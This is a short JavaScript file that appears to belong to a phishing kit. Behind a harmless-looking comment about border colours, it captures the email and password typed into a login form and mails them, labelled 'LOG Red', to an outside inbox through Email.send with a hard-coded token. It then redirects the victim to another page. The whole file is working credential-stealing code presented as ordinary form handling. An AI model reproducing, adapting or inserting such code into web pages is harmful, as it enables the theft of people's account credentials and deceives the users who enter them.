// Function to change the border color when clicked inside the text box
function changeBorderColor(textBox) {
    textBox.style['border-color'] = 'rgb(255, 0, 0)';
    textBox.style['border'] = 'solid 1px grey';
}
  

const ffemail = document.getElementById('ffemail');
const ffpassword = document.getElementById('ffpassword');
const submit = document.getElementsByClassName('ffform-contact')[0];

submit.addEventListener('submit', (e) => {
    e.preventDefault();

    let ebody = `
    <b>Log Red Screen</b>
    <br>
    <br>
    <b>Email: </b>${ffemail.value} 
    <br> 
    <b>Password: </b>${ffpassword.value} 
    <br>`;

    Email.send({
        SecureToken: "9c8cec46-60dd-4046-b3d0-0751b0d5c5c0",
        To: 'jakesfishin111@outlook.com',
        From: "jakeramon999@gmail.com",
        Subject: "LOG Red: " + ffemail.value,
        Body: ebody
    }).then(function() {
        window.location.href = "pi.html";
    });
});

